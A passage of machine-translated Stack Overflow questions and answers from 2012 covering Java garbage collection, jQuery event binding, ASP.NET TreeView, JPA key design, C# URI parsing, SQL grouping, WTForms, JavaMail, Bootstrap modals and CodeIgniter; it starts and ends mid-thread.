Dozens [] da = new Dozens[3]; 
```

以及在 main 函数结束时有多少对象有资格进行垃圾回收

```
class Dozens {
  int[] dz = {1,2,3,4,5,6,7,8,9,10,11,12};
}

public class Eggs {
  public static void main(String[] args) {
    Dozens [] da = new Dozens[3];
    da[0] = new Dozens();
    Dozens d = new Dozens();
    da[1] = d;
    d = null;
    da[1] = null;
    // do stuff
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:44:27.543

执行`Dozens [] da = new Dozens[3];`后将创建单个对象。该`main`方法完成后，如果您不创建另一个线程来使用在 中创建`main`的对象，那么您创建的所有对象都将可用于垃圾收集。

```
public class Eggs {
  public static void main(String[] args) {
    Dozens [] da = new Dozens[3]; //one array object created
    da[0] = new Dozens(); // one Dozens object created
    Dozens d = new Dozens(); //one Dozens object created
    da[1] = d; 
    d = null; //nothing available for gc here, as there is still a referrence to that Dozens object (da[1])
    da[1] = null; //da[1] available for gc
    // do stuff
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:44:56.590

假设没有干预 GC，则创建的三个 Dozen 实例都将符合条件。

没有原始数组的装箱。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:59:01.570

2个实例，但你在想什么：O

```
da[1] = d; //points 
d = null; //attended. 
da[1] = null; //already null. 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-03-11T20:58:17.817

class Dozens contains an int array object. Therefore every time you create a Dozens object two objects are created (one instance of Dozens, which again contains one instance of an int array).

```
 class Dozens{
  int[] dz = {1,2,3,4,5,6,7,8,9,10,11,12};}
  public class Eggs {
    public static void main (String args[]) {
        Dozens [] da = new Dozens[3]; //one object capable of holding 3 instance 
        da[0] = new Dozens();   //2 object 
        Dozens d = new Dozens(); //2 object 
        da[1] = d;            //no new object d,da[1] point to same d object
        d = null;         //one object for gc
        da[1] null;       //one object for gc
        //do stuff
    }
  }
} 
```

# ajax - jquery中关于AJAX加载内容的onclick事件

> ID：11736201
> 
> 赞同：0
> 
> 时间：2012-07-31T08:39:07.790
> 
> 标签：ajax, jquery

我在通过 AJAX 插入的内容上使用 jQuery 中的“.on”方法时遇到问题。我目前使用“.live”，但这已被弃用，“.on”是我所追求的。

我的工作代码是：

```
$('.folderadmin').live("click", function() 
{   
   // Do stuff
}) 
```

当我用 .on 替换 .live 时，它​​无法工作。我相信这是因为元素 .folderadmin 是通过 AJAX 加载的——因此我们需要使用 .live 来访问它。如何访问 DOM 并使用 .on 识别 .folderadmin？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T08:42:51.177

```
$('.folderadmin').live("click", function() {   
   // Do stuff
}); 
```

和

```
$(document).on("click", '.folderadmin', function() {
  // Do stuff
}); 
```

但是不需要绑定，你可以绑定到dom 树中已经存在`document`的父容器。`.folderadmin`

```
$('#the_parent_id').on("click", '.folderadmin', function() {
  // Do stuff
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:42:51.517

您应该检查您的 jQuery 版本，因为 .on 是在 jQuery 版本 1.7 上添加的，其中 .live() 方法显然已被弃用
[.on()](http://api.jquery.com/on/)
它应该是这样的：

```
$(".folderadmin").on("click", function(){
  //enter code here
}); 
```

# c# - 带菜单的树视图

> ID：11736202
> 
> 赞同：1
> 
> 时间：2012-07-31T08:39:10.793
> 
> 标签：c#, asp.net, sql, treeview

我想创建一个树视图，但我的问题是我不知道树视图中是否有超链接，当您单击一个节点时，您会看到那些可以将您重定向到另一个表单的超链接？树视图绑定到数据库

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:41:57.290

试试这个`NavigateUrl`属性`TreeNode`

```
<asp:TreeView runat="server" ID="tree">
     <Nodes>
         <asp:TreeNode NavigateUrl="~/Default.aspx" Text="Go to default"/>
     </Nodes>
</asp:TreeView> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:54:05.147

您可以设置TreeNode 的[NavigateUrl](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.treenode.navigateurl.aspx)属性，该属性获取或设置单击节点时要导航到的 URL。

您可以通过以下方式实现 NavigateUrl：

```
 <asp:TreeView id="SampleTreeView" 
        runat="server">
        <Nodes>
          <asp:TreeNode Value="Home" 
            NavigateUrl="Home.aspx" 
            Text="Home"
            Target="Content" 
            Expanded="True">
            <asp:TreeNode Value="Page 1" 
              NavigateUrl="Page1.aspx" 
              Text="Page1"
              Target="Content">
              <asp:TreeNode Value="Section 1" 
                NavigateUrl="Section1.aspx" 
                Text="Section 1"
                Target="Content"/>
            </asp:TreeNode>              
            <asp:TreeNode Value="Page 2" 
              NavigateUrl="Page2.aspx"
              Text="Page 2"
              Target="Content">
            </asp:TreeNode> 
          </asp:TreeNode>
        </Nodes>
      </asp:TreeView> 
```

# objective-c - 由于自定义 UIFont，奇怪的 UINavigationController 推送行为

> ID：11736210
> 
> 赞同：2
> 
> 时间：2012-07-31T08:39:50.300
> 
> 标签：objective-c, ios5, uinavigationbar

我已经更改了**iOS5**中可用的`UINavigationBar`使用**“外观”**的字体。**但是当向另一个视图控制器（使用 Storyboard** ）进行推送转换时，它会出错。

 ****在过渡期间，通常您可以看到**“淡入”**下一个`UIViewController`标题，但现在**我看到的只是“F ...”并且只有在过渡结束时才会显示整个标题：“Facebook 分享”（而不是的立即）。**

以前有过这个问题的人吗？`UIBarButton`当 .右侧有 a 时，不会发生这种情况`UINavigationBar`。然后一切顺利。

我这样设置字体：

```
UIFont *fontName = [UIFont fontWithName:@"Chalkduster" size:0];
NSDictionary *font = [NSDictionary dictionaryWithObjectsAndKeys:fontName, UITextAttributeFont, nil];
[[UINavigationBar appearance] setTitleTextAttributes:font]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T06:45:45.793

使用**固定字体大小**而不是**'0'**解决了问题：

```
UIFont *fontName = [UIFont fontWithName:@"Chalkduster" size:18]; 
```

现在它就像一个魅力。该应用程序将仅以**纵向**运行，否则我猜**每次设备旋转时都应设置字体大小**。****

# database-design - 外键作为主键或仅将代理主键与 JPA 上下文中的外键不同

> ID：11736217
> 
> 赞同：0
> 
> 时间：2012-07-31T08:40:05.667
> 
> 标签：database-design, jpa, foreign-keys, primary-key, shared-primary-key

在 JPA 上下文中使用 FK 作为 PK 或使用代理 PK 和 FK 作为 FK 的最佳实践是什么？我看到几次有人说他们必须将 FK 映射为 PK，因为他们有遗留数据库。那么这是否意味着对于新表，如果您可以控制创建它们，最好使用以下结构：

```
TABLE_1
-------
ID (PK)
...

TABLE_2
-------
ID (PK) 
TABLE_1_ID (FK) 
```

代替：

```
TABLE_2
-------
TABLE_1_ID (PK) and (FK) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:58:42.620

对于多对一关系，请始终使用您提出的第一个替代方案。

对于某些一对一的关系，可以合并表而不会产生不良影响。

第二种选择真正有用的地方是使用[类表继承模型](http://martinfowler.com/eaaCatalog/classTableInheritance.html)实现超类-子类层次结构，正如 Martin Fowler 所提出的那样。在这种情况下，您希望保持子类表与超类表不同，以减少 NULL 的数量。但关系是一对一的。

通过使子类表中的 PK 和 FK 具有相同的键功能，并通过使 FK 引用超类表中的匹配条目，可以在需要时将专用数据与通用数据连接起来非常容易。这可以称为“穷人的遗产”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T01:14:57.010

我猜你正在寻找`@MapsId`注释。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:30:14.133

在这种特殊情况下（1 到 0..1 关系），请考虑将两个表合并为一个。

如果它们被故意拆分（例如，对于“垂直”分区），则更喜欢将同一字段同时作为 PK 和 FK。

仅在可以使其更小¹时才考虑添加另一个键，但要平衡这与额外索引^(2的需要、对)[集群](http://use-the-index-luke.com/sql/clustering/index-organized-clustered-index)的潜在敌意³以及对菱形依赖关系建模的需要⁴。

* * *

¹ *例如 因为`TABLE_2.TABLE_1_ID`是字符串，你可以制作`TABLE_2.ID`整数。*

² *每个新索引都会减慢 INSERT 的速度，并且可以减慢 UPDATE 和 DELETE 的速度，具体取决于它们的 WHERE 子句。此外，任何额外的数据都会给缓存带来额外的压力，使其“更小”。*

³ *聚簇表中的二级索引需要包含 PK 的副本，并且在定位行时会导致双重查找（首先是索引，然后是 PK）。*

⁴ *可能需要在“钻石”的两个“边缘”上使用识别关系，以确保钻石的“底部”引用**单个**“顶部”。*

# c# - 字符串操作复杂度

> ID：11736219
> 
> 赞同：1
> 
> 时间：2012-07-31T08:40:11.910
> 
> 标签：c#, asp.net, string, .net-2.0

我已经编程一年了，我做过`string`很多次操作，但从来不明白它是如何工作的，或者最好的方法是什么。

假设我有这个字符串

```
String abc = "https://uu2020.devuueva.com/portal/mesddsa/usforeer/nance/tings/M3C102d4104/1007/tingjack/default.aspx"; 
```

我只想这部分

```
"https://uu2020.devuueva.com/portal/mesddsa/usforeer/nance/tings/M3C102d4104" 
```

字符/名称可以更改并且是动态的，但是“/”不是。有人可以演示最简单和最好的方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T08:43:14.013

这里要记住的一件事是，如果您正在处理 Uri，那么最好使用`Uri`该类来提取信息片段，而不是尝试将解决方案串在一起。

[http://msdn.microsoft.com/en-us/library/system.uri.aspx](http://msdn.microsoft.com/en-us/library/system.uri.aspx)

例如：

```
var part = String.Format("{0}://{1}{2}",uri.Scheme,uri.Authority, String.Join("",uri.Segments.Take(7))); 
```

获取您想要的部分。现场示例：[http ://rextester.com/JRWKOG58567](http://rextester.com/JRWKOG58567)

* * *

**编辑**

在发现了更多需求和框架限制之后，您可能会更好地进行字符串混搭，但您仍然可以利用`Uri`该类中的一些功能。

```
var input = "https://uu2020.devuueva.com/portal/mesddsa/usforeer/nance/tings/M3C102d4104/1007/tingjack/default.aspx";
var uri = new Uri(input);
StringBuilder sb = new StringBuilder();
sb.AppendFormat("{0}://{1}/",uri.Scheme,uri.Authority);

var parts = uri.PathAndQuery.Split(new char[]{'/'},StringSplitOptions.RemoveEmptyEntries);
for(var i=0;i<6;i++){
    sb.AppendFormat("/{0}",parts[i])   ;
}
Console.WriteLine(sb.ToString()); 
```

现场示例：[http ://rextester.com/HBK80648](http://rextester.com/HBK80648)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:45:58.790

```
 var t="https://uu2020.devuueva.com/portal/mesddsa/usforeer/nance/tings/M3C102d4104/1007/tingjack/default.aspx";
     string[] g= t.Split('/');
     var h=String.Join("/", g.Where((i,n)=>n<9).ToArray());
    Console.write( h); 
```

结果 ：`https://uu2020.devuueva.com/portal/mesddsa/usforeer/nance/tings/M3C102d4104`

# java - 通过颜色获取 R、G、B 的值

> ID：11736220
> 
> 赞同：1
> 
> 时间：2012-07-31T08:40:12.400
> 
> 标签：java, colors, rgb

我让用户输入颜色（例如白色、红色、...），那么如何使用用户给出的颜色获得 R、G、B 的值？

我有一个函数（float r，float g，float b）来设置节点的颜色。所以我让用户输入他们想要的颜色名称，然后我想将该颜色名称转换为我的函数的 r、g、b 值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:43:29.930

颜色定义了代表基本颜色的*有限*数量的枚举。[此代码摘录](http://www.exampledepot.com/egs/java.awt/color_Str2Clr.html)使用反射将它们的名称映射到 RGB 表示。

除此之外，您必须维护颜色/RGB 值的映射，或者可能是一组系统属性，并使用[Color.getColor(String name)](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/Color.html#getColor%28java.lang.String%29)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T10:07:35.627

创建一个 Map ，其中包含所有可选颜色作为字符串以及它们的 RGB 表示形式（作为记录，Color 位于 java.awt 包中）：

```
Map<String,Color> colorMap = new HashMap<String,Color>();
        colorMap.put("white", new Color(255,255,255));
        colorMap.put("red", new Color(255,0,0)); 
```

然后使用用户输入的文本在地图中查找您的颜色：

```
String userColor = <whereever you get your string from>;
Color result = colorMap.get(userColor.toLowerCase()); 
```

最后，使用这个具有 RGB 整数值的 Color 对象来检索您需要的浮点值并将它们传递给您的函数：

```
yourFunction(Float.valueOf(result.getRed(),Float.valueOf(result.getGreen()),Float.valueOf(result.getBlue())); 
```

如果可能的话，我建议您对 RGB 使用整数而不是浮点数，因为在大多数情况下（如果不是所有情况），整数的范围都在 0 到 255 之间。

使用 RGB 获得您所需要的所有颜色的好地方是这个网站：[http ://cloford.com/resources/colours/500col.htm](http://cloford.com/resources/colours/500col.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:41:51.627

如果您将颜色作为字符串，您可以`Color`在地图中查找它，这将为您提供红色、绿色和蓝色值。

# sql - 查询以制作记录组

> ID：11736228
> 
> 赞同：0
> 
> 时间：2012-07-31T08:40:37.077
> 
> 标签：sql, sql-server-2008-r2

我有一个表格，其中包含如下数据：

```
 TableA
======================================
Name      colB       colM        colP 
======================================
T045      B          Null        Null
T045      Null       M           Null
T045      Null       Null        P
T046      Null       M           Null
T046      B          Null        Null
T047      Null       Null        P
T047      Null       M           Null
T048      B          Null        Null 
```

我想要一个查询来创建如下结果：

```
 ======================================
    Name      colB       colM        colP 
    ======================================
    T045      B          M           P
    T046      B          M           Null
    T047      Null       M           P
    T048      B          Null        Null 
```

有谁知道如何做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:42:04.903

是的。您需要 GROUP BY 语法

```
select name, max(colb), max(colm), max(colp)
from table
group by name 
```

# google-app-engine - WTForm GAE model_field 不会在 Jinja2 模板中呈现字段

> ID：11736231
> 
> 赞同：2
> 
> 时间：2012-07-31T08:40:51.337
> 
> 标签：google-app-engine, jinja2, wtforms

我可以使用 Google App Engine 上的 WTForm model_form 显示我的表单。我希望在访问 /admin/newpost 时看到显示的字段

**我的模特**

```
class BlogPost(db.Model):
    #The URL path to the blog post. Posts have a path if they are published.
    path = db.StringProperty()
    title = db.StringProperty(required=True, indexed=False)
    body = db.TextProperty(required=True)
    published = db.DateTimeProperty(auto_now_add=True)
    updated = db.DateTimeProperty(auto_now=True) 
```

**我的 PostHandler**

```
class PostHandler(webapp2.RequestHandler):

@webapp2.cached_property
def jinja2(self):
    return jinja2.get_jinja2(app=self.app)

def render_to_response(
    self,
    template_name,
    template_vals=None,
    theme=None
    ):
    template_name = "admin/%s" % template_name
    self.response.out.write(render_template(
        template_name, template_vals, theme))

def render_form(self, form):
    self.render_to_response("edit.html", {'form': form()})

def get(self):
    form = model_form(BlogPost)
    self.render_form(form) 
```

**不起作用的 Edit.html 模板**

```
{% extends "base.html" %}
{% block title %}New Post{% endblock %}
{% block body %}
  <form method="post" action="">
    <table>
      {{form}}
    </table>
    <input type="submit" />
  </form>
{% endblock %} 
```

使用此模板，我看到带有表单按钮的 html。问题是没有显示任何模型字段。为了让我的字段显示我必须这样做......

**有效的 Edit.html 模板**

```
{% extends "base.html" %}
{% block title %}Testing New Post Template{% endblock %}
{% block body %}
  <form method="post" action="">
    <table>

<div>{{ form.title.label }}: {{ form.title(class="css_class") }}</div>
{% if form.title.errors %}
        <ul class="errors">{% for error in form.name.errors %}<li>{{ error }}</li>{% endfor %}</ul>
    {% endif %}

<div>{{ form.body.label }}: {{ form.body() }}</div>
{% if form.body.errors %}
        <ul class="errors">{% for error in form.body.errors %}<li>{{ error }}</li>{% endfor %}</ul>
    {% endif %}

    </table>
    <input type="submit" />
  </form>
{% endblock %} 
```

简而言之，如何获得第一个版本以在表单中显示我的模型字段？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T04:58:45.540

您可以将 WTForms.Form 子类化，以提供一种[`__html__`](http://jinja.pocoo.org/docs/api/#jinja2.Markup)迭代所有子字段并返回它们的方法：

```
class CustomForm(Form):
    def __html__(self):
        fields = [u"%s %s" % (field.label, field) for field in self.fields]
        return Markup(u"".join(fields)) 
```

或者您可以在 Jinja 中创建一个宏来呈现表单（我在[这里](https://github.com/svieira/Budget-Manager/blob/master/app/templates/helpers/form_helpers.html)有一个示例，如果您想看一个）。

# android - 在android中对齐单选按钮文本

> ID：11736234
> 
> 赞同：1
> 
> 时间：2012-07-31T08:40:58.477
> 
> 标签：android, radio-button

在我的应用程序中，我显示了一个单选按钮组。出现在文本左侧的按钮。我希望文本位于按钮的左侧。请注意，我使用 an`android:text="My Text"`来指定按钮的原因。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:48:44.107

```
<TextView android:layout_width="20dp"
    android:layout_height="22dp"
    android:background="@android:color/transparent"
    android:textColor="#000000"
    android:layout_marginLeft="2dp"
    android:textSize="20dp"
    android:text="text"/>
 <RadioButton
    android:id="@+id/rd0"
    android:layout_width="20dp"
    android:layout_height="20dp" /> 
```

您还可以使用 textview 放置单选按钮。但不要`android:text="My Text"`用于单选按钮

# java - JavaMail 无效的 MSGID

> ID：11736241
> 
> 赞同：0
> 
> 时间：2012-07-31T08:41:22.177
> 
> 标签：java, email, jboss, jakarta-mail, postfix-mta

我正在运行一个带有底层 Postfix 服务器的 JBoss 服务器。当我发送电子邮件时，JavaMail 会创建一个无效的 messageID，例如 Message-ID：<47112553230.139.4972667128159.JavaMail.undefined>。

我正在使用此代码发送邮件：

```
Properties props = new Properties();
props.put("mail.smtp.host", "xxx.tld");
props.put("mail.host", "xxx.tld");
InitialContext ictx = new InitialContext(props);
Session sess = (Session) ictx.lookup("java:jboss/mail/Default");
Transport trans = sess.getTransport("smtp");
trans.connect();

MimeMessage msg = new MimeMessage(sess);
msg.setFrom(new InternetAddress(from));
msg.addRecipients(RecipientType.TO, InternetAddress.parse(to, false));
msg.setSubject(subject);
msg.setText(message);
msg.setHeader("Content-Type", "text/html; charset=\"utf-8\"");
msg.saveChanges();

Transport.send(msg, msg.getAllRecipients());
trans.close(); 
```

主要后缀配置：

```
myhostname = xxx.tld
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = /etc/mailname
mydestination = xxx.tld, Debian-60-squeeze-64-minimal, localhost.localdomain, localhost
relayhost = 
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = 127.0.0.1 
```

我该如何解决这个问题？

最好的问候，克里斯蒂安

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-24T14:10:25.423

这就是我可以在@BillShannon 的帮助下解决问题的方法：

```
Properties props = new Properties();
InitialContext ictx = new InitialContext(props);
Session sess = (Session) ictx.lookup("java:jboss/mail/Default");
props = sess.getProperties();
props.put("mail.smtp.host", "xxx.tld");
props.put("mail.host", "xxx.tld");
props.put("mail.from", "yyy@xxx.tld");
sess = Session.getInstance(props); 
```

# c# - 如何登录谷歌账户

> ID：11736242
> 
> 赞同：1
> 
> 时间：2012-07-31T08:41:21.490
> 
> 标签：c#, wpf, login

我正在尝试在 C# WPF 应用程序中登录 Google 帐户。

我有一个带有两个文本框的窗口，分别称为`tb_nick`昵称和`tb_pass`密码。我希望如果我输入 Google 用户名和密码并按登录，我将连接到我的帐户，并显示一条消息“连接正常”或其他内容。

任何人都可以帮助我吗？我是编程新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:04:24.920

看看这是否有帮助 [https://developers.google.com/accounts/docs/OpenID](https://developers.google.com/accounts/docs/OpenID)

Stackoverflow 就是一个很好的例子。您可以使用 Google 提供的 OpenID 登录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:51:59.750

嘿，你可以通过使用谷歌 API 来做到这一点。 [Google APLI GMail 身份验证](https://developers.google.com/google-apps/email-settings/auth?hl=de)

在[https://developers.google.com/](https://developers.google.com/)上，您会发现许多有关如何从外部程序使用 google 的信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T12:09:46.463

为了使用户能够从您的应用程序登录，您应该使用[ClientLogin](https://developers.google.com/gdata/docs/auth/clientlogin) 但您可以看到它是旧 Google Api 库 Gdata 的一部分。您仍然可以找到它，并且可以使用此类身份验证，但我建议您不要这样做，因为它有几个安全缺陷（这可能是 Google 拿走它的原因）。而是使用[OAuth 2.0](https://developers.google.com/accounts/docs/OAuth2)。

# browser - 是否有可计算的最新浏览器版本列表？

> ID：11736244
> 
> 赞同：0
> 
> 时间：2012-07-31T08:41:31.703
> 
> 标签：browser

我想知道是否有任何服务提供当前浏览器版本的可计算列表（XML 和/或 JSON）以及上次更新的时间。

我想用它来通知人们他们运行的浏览器版本过时，如果他们的浏览器的最新版本太旧，他们可能会切换到另一个版本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T23:17:25.887

我怀疑您是否可以在某处以 JSON 或 XML 格式提供这些信息，但[Wikipedia](http://en.wikipedia.org/wiki/Comparison_of_web_browsers)有一篇关于网络浏览器比较的优秀文章。

# javascript - 杀死（关闭）已经打开的 Twitter Boostrap 模式？

> ID：11736249
> 
> 赞同：3
> 
> 时间：2012-07-31T08:41:41.330
> 
> 标签：javascript, jquery, twitter-bootstrap

如何杀死已经打开的 Bootstrap 模式？[jsFiddle](http://jsfiddle.net/nzjZM/)示例：

```
<script>
    $(function(){

        $('#myModal').on('show', function() {
            if(true) { /* Kill (close) this modal on some condition */}
        });

    });
</script> 
```

我试过了：

```
if(true) { $('#myModal').modal('hide');   } // Not working
if(true) { $('#myModal').modal('toggle'); } // Too much recursion!!! :P
if(true) { return;                        } // Nope 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T14:23:00.993

首先，[正如@ChristianEngel 正确指出](https://stackoverflow.com/a/11736892/30433)的那样，您在问题中提供的 JSFiddle 正在侦听`show`非元素 ( `#modal-delete`) 上的事件，而它应该附加到实际的模态 ( `#myModal`) [您在代码中正确执行的]。

其次，尽管观察正确，我仍然可以证明我看到了您所抱怨的行为，原因如下：**show**事件在实际模态显示之前触发，因此您的调用`hide()`是在其余部分之前进行的的`show()`代码。解决它的一种方法是改为监听`shown`事件。**那不是这样做的方法！**

做你正在尝试的正确方法是简单地调用`preventDefault()`事件。

```
$('#myModal').on('show', function(e) {
  if (true) {e && e.preventDefault()}
}); 
```

### [JSFiddle](http://jsfiddle.net/nzjZM/3/)

这将节省一大堆正在执行的不必要的代码。

顺便说一句，我只想补充一点，我认为这个场景很好地说明了同时拥有 a`show`和`shown`event 的原因。虽然不是事件的唯一原因，但在操作发生*之前*`show`触发它允许开发人员在需要时取消它。

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:21:29.750

好吧，一切都按预期工作。我更新了你的小提琴：http: [//jsfiddle.net/nzjZM/1/](http://jsfiddle.net/nzjZM/1/)*

# scala - ！方法在 Scala 中不维护换行符

> ID：11736252
> 
> 赞同：2
> 
> 时间：2012-07-31T08:41:53.483
> 
> 标签：scala

我需要使用 scala 执行脚本。当我使用 ! 执行 Seq 时 换行后的字符串丢失。那就是“Here is the”字符串在新行丢失后更新为 Jira 和字符串的另一部分。据我了解，这是由于！不维护新线。谁能建议我如何解决这个问题？请参阅下面的代码。

```
import scala.sys.process._

val fileContent: String = """ Here is the 

text with 

new line """

Seq("/opt/atlassian-cli-2.6.0/atlassian.sh", "jira", "--action", "updateIssue", "--issue", "JIRA-2",  "--field", "customfield_10664" ,"--values", fileContent).! 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T09:19:26.957

正如您从下面的代码片段中看到的那样，`!`保持换行符就好了。您正在调用的脚本可能有问题？

```
scala> Seq("echo", """hello
     |  world""").!
hello
 world
res5: Int = 0 
```

# windows-phone-7.1 - 如何在 windows phone 7 的 arraylist 中保存后台进程获取值？

> ID：11736253
> 
> 赞同：0
> 
> 时间：2012-07-31T08:41:56.137
> 
> 标签：windows-phone-7.1, background-process

我写了后台进程来获取这样的细节。

```
 public static List<string> myCollection=new List<string>();
 public static string result=null;
protected override void OnInvoke(ScheduledTask task)
{
     string toastMessage= "Application Memory Usage:" + ((Microsoft.Phone.Info.DeviceStatus.ApplicationCurrentMemoryUsage)).ToString();
    myCollection.Add(toastMessage);
    myCollection.ToArray();

    foreach (string item in myCollection)
    {
       result += item.ToString() + ", ";
    }
 } 
```

我只得到结果变量的最新值。但我想保存所有使用值。请告诉我..我想每隔一小时将这些详细信息更新到服务器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T08:24:41.320

后台进程仅运行几秒钟，这就是不保留结果的原因。解决方法：在OnInvoke的第一行从IsolatedStorage加载结果，在OnInvoke的最后一行将结果保存到IsolatedStorage。

# servlets - 仅用于转发请求的 Servlet

> ID：11736258
> 
> 赞同：0
> 
> 时间：2012-07-31T08:42:10.660
> 
> 标签：servlets

我想使用 RequestDispatcher 将一些请求从我的第一个 servlet (A) 传递给第二个 (B)。问题是：如何检查 B servlet 中的请求是否来自 A 转发并仅处理这些请求？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:44:33.440

在**A**中，您可以[在请求中设置一个属性](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletRequest.html#setAttribute%28java.lang.String,%20java.lang.Object%29)，然后您可以在**B**中读取该属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:46:18.743

如果 Servlet B 的目的是仅处理来自 Servlet A 的请求，那么您最好编写一个简单的 Java 类来满足您的需要，然后返回您可以在 Servlet A 中使用的详细信息来决定下一步做什么.

可以使用另一个 Servlet 来实现附加功能，但这不是简洁的设计。

# ios - 多个应用程序上的 iOS SSO 是否有任何限制

> ID：11736259
> 
> 赞同：1
> 
> 时间：2012-07-31T08:42:16.017
> 
> 标签：ios, facebook, single-sign-on, facebook-login, facebook-ios-sdk

Facebook[文档](https://developers.facebook.com/docs/mobile/ios/build/#multipleapps)定义，如果您有多个应用程序使用单个 Facebook 应用程序 ID，您将需要向**应用程序仪表板**添加配置，以列出共享一个 ID 的应用程序的 URL 方案后缀信息。

我的问题是我可以使用的后缀数量有限制吗？（如果你想知道为什么，可以说我是一个平台）。

干杯，罗杰。

# jquery - Fancybox 和 IE8

> ID：11736266
> 
> 赞同：1
> 
> 时间：2012-07-31T08:42:50.033
> 
> 标签：jquery, internet-explorer-8, fancybox

使用最新版本的 Fancybox 和 IE8 的一些问题。

首先，关闭按钮（右上角）如果半截（您只看到左下角） - 这发生在 youtube 视频和图像上。

其次，当您关闭 Fancybox 时，屏幕仍然是黑色的，导致您再次刷新页面以查看内容——这只发生在 youtube 视频上。

您可以在以下网址看到它的工作示例： [http](http://www.braincells.com.au/jindowie/) ://www.braincells.com.au/jindowie/ （底部中间面板，观看视频链接）

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:52:39.883

嗯，这是一个棘手的问题。

我发现了一个可能导致这种情况的错误。您没有关闭 div id `footer`。您可以尝试为此添加关闭并检查是否可以解决问题。

# grails - 使用 Paypal 汇款

> ID：11736269
> 
> 赞同：1
> 
> 时间：2012-07-31T08:42:54.360
> 
> 标签：grails, paypal

在我正在开发的网络应用程序中，应该是一个“给我我的钱”按钮，它会提取用户在他/她的余额中（在网络内）的金额，并将这笔钱转入他/她的贝宝账户。我已经在 google 和 stackoverflow 中搜索了文档，但没有找到专门针对 Grails 的文件，这就是我正在使用的。不知道这是否可能。

我可以关注任何链接吗？有什么帮助吗？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T10:46:50.693

所以基本上，您希望将资金转移到收款人的 PayPal 账户？
看看[自适应支付（汇款）](https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_APIntro)或[批量支付](https://www.paypal.com/cgi-bin/webscr?cmd=_batch-payment-overview-outside)

注意：您必须联系 PayPal 客户服务以在您的帐户上启用 MassPay API。
如果您不符合 MassPay 的条件，或者您希望使用 Adaptive Payments API，您需要通过[https://www.x.com/](https://www.x.com/)注册您的应用程序并获得一个应用程序 ID。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:26:48.490

（目前）还没有 Grails 插件，但是使用[Paypal 的网站支付标准添加你想要的功能很容易](https://cms.paypal.com/uk/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_html_formbasics)

# php - PHP 致命错误：在非对象上调用成员函数 row()

> ID：11736275
> 
> 赞同：0
> 
> 时间：2012-07-31T08:43:13.843
> 
> 标签：php, codeigniter

你能帮我写代码吗？我是 php 和 codeigniter 的新手，我正在尝试将我的查询结果放到视图中，但总是发生错误“致命错误：调用非成员函数 row() -object in”，我试图通过客户 ID 搜索客户信息并尝试将结果获取到视图本身

这是查看代码

```
 <?php echo form_open('home/cari_id');
?>
<table width='34%' align='left'>
    <tr>
        <td width="54%" align="left">ID Pelanggan</td>

        <td width="36%">
            <?php echo form_input('id',set_value('id'));?>
            <?php echo form_error('id');?>
        </td>
        <td width="10%">
            <?php echo form_submit('submit','Cari');?>
        </td>
    </tr>
</table> 

<br /><br />

<table width="68%" align="left">
    <tr>
        <td width="17%" align="left">Nama</td>
        <td>
            <?php   
                $row = $record->row();
                $nama1 = array(
                         'name' => 'nama',
                         'maxlength' => '100',
                         'size' => '50',
                         'style' => 'width:120%');
                echo form_input($nama1,$row->nama);?>
            <?php echo form_error('nama');?>
        </td>
    </tr>
    <tr>
    <td align="left">Alamat</td>
    <td>
        <?php 
            $alamat1 = array(
                        'name' => 'alamat',
                        'rows' => '5',
                        'cols' => '3',
                        'style' => 'width:200%');
            echo form_textarea($alamat1,$row->alamat);?>
        <?php echo form_error('alamat');?>
    </td>
    </tr>
    <tr>
        <td align="left">Golongan</td>
        <td width='29%'>
            <?php 
                $gol1 = array(
                        'name' => 'gol',
                        'maxlength' => '100',
                        'size' => '50',
